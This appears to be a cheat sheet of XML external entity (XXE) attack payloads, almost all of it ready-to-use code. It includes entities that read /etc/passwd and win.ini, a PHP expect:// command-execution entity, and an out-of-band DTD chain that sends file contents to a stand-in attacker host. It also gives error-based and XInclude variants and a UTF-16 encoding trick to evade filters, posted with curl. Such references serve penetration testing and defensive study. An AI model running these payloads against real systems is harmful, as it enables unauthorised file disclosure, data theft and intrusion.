# XXE Payload Reference

## Classic probes

```xml
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x "probe">]><a>&x;</a>
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><a>&x;</a>
```

## PHP wrapper extras

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY x SYSTEM "expect://id">        <!-- if expect extension loaded -->
```

## OOB exfil DTD chain

```xml
<!-- attacker-hosted /evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.tld/?d=%file;'>">
%eval;
%send;

<!-- target payload -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % dtd SYSTEM "https://attacker.tld/evil.dtd">%dtd;]><a>x</a>
```

CDATA-safe variant (for content with markup):

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
%all;
<a>&fileContents;</a>
```

## Error-based

```xml
<!DOCTYPE a [
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///qqqq/%file;'>">
 %eval;
]>
<a>&err;</a>
```

## XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## SOAP body embedding

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<soap:Body><getData><input>&xxe;</input></getData></soap:Body>
</soap:Envelope>
```
(DOCTYPE after Envelope open tag is invalid XML per spec but many parsers
accept it — worth one attempt only.)

## Encoding bypass

```bash
# Naive filters grep for "<!DOCTYPE" in bytes; UTF-16 hides it:
echo '<!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/hostname">]><a>&x;</a>' \
  | iconv -f UTF-8 -t UTF-16 > payload16.xml
curl -X POST https://target/import --data-binary @payload16.xml \
  -H "Content-Type: application/xml"
```
